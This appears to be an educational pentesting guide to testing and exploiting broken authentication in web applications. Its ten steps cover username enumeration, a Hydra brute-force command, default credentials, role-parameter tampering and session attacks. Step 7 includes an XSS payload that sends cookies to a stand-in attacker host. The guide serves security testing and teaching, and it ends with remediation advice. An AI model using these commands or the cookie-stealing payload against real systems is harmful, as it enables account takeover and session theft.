# Broken Authentication

[Relative Cheat Sheet](./broken-auth-cheat.md)

## Step-by-Step Guide for Testing and Exploiting Broken Authentication Vulnerabilities

### 1. Understand Authentication Mechanisms
   - **Explanation**: Authentication verifies identity via knowledge (passwords, PINs), ownership (TOTP, tokens), or inherence (biometrics). Broken authentication occurs when these are weakly implemented, allowing bypasses or unauthorized access.
   - **Why It's Done**: Knowing the auth flow (e.g., session tokens, resets) helps identify flaws like weak passwords or missing validations.
   - **Example**: A login form with no rate limiting or a predictable reset token.

### 2. Enumerate Valid Usernames
   - **Explanation**: Submit usernames with invalid passwords to detect response differences (e.g., "Invalid password" vs "User not found") or timing variations.
   - **Why It's Done**: Valid usernames enable targeted brute forcing or social engineering.
   - **Example**: Test `/login?user=admin` vs `testuser` to see different error messages.

### 3. Brute Force Passwords or Tokens
   - **Explanation**: Use tools like Hydra or Medusa to guess passwords or reset tokens for enumerated users.
   - **Why It's Done**: Weak credentials or tokens grant unauthorized access.
   - **Example**: `hydra -l admin -P passwords.txt http-post-form "/login:user=^USER^&pass=^PASS^:F=invalid"`.

### 4. Test Password Reset Mechanisms
   - **Explanation**: Submit reset requests to check for guessable tokens, weak security questions, or injectable fields (e.g., username in reset URL).
   - **Why It's Done**: Flawed resets allow bypassing login via token guessing or manipulation.
   - **Example**: `/reset?user=admin&token=123`—try changing `user` to another account.

### 5. Test Default or Weak Credentials
   - **Explanation**: Attempt common credentials (e.g., admin:admin) or check for known defaults in the cheat sheet (e.g., Cisco:cisco).
   - **Why It's Done**: Default or weak credentials are common in misconfigured systems.
   - **Example**: Login with `admin:password` on a router admin panel.

### 6. Bypass Authentication Logic
   - **Explanation**: Access protected pages directly (e.g., `/admin`) or modify parameters (e.g., `role=user` to `role=admin`) to bypass checks.
   - **Why It's Done**: Weak access controls allow unauthorized entry without credentials.
   - **Example**: Change `GET /profile?role=user` to `role=admin` in Burp.

### 7. Exploit Session Attacks
   - **Explanation**: Test for session fixation (set cookie pre-login, check if persists) or hijacking (steal via XSS or predictable IDs).
   - **Why It's Done**: Compromised sessions grant persistent access.
   - **Example**: XSS payload `<script>document.location='attacker.com/?c='+document.cookie</script>` to steal session.

### 8. Test Session Timeout and Entropy
   - **Explanation**: Leave sessions idle to check expiration, or brute force session IDs for low entropy.
   - **Why It's Done**: Long-lived or predictable sessions increase hijacking risk.
   - **Example**: Generate sequential IDs to test if valid.

### 9. Chain with Other Vulnerabilities
   - **Explanation**: Combine with XSS (steal sessions) or CSRF (force actions) for escalation.
   - **Why It's Done**: Amplifies impact, like account takeover.
   - **Example**: XSS to deliver CSRF payload changing user settings.

### 10. Assess Prevention Measures
   - **Explanation**: Check for strong passwords, 2FA, rate limits, secure cookies (HttpOnly, Secure flags), and proper timeouts.
   - **Why It's Done**: Informs remediation to strengthen auth.
   - **Example**: Recommend 2FA and lockouts after 5 failed attempts.

This guide, based on PortSwigger Web Security Academy and the provided cheat sheet, provides a detailed process for testing broken authentication. Test ethically within scope.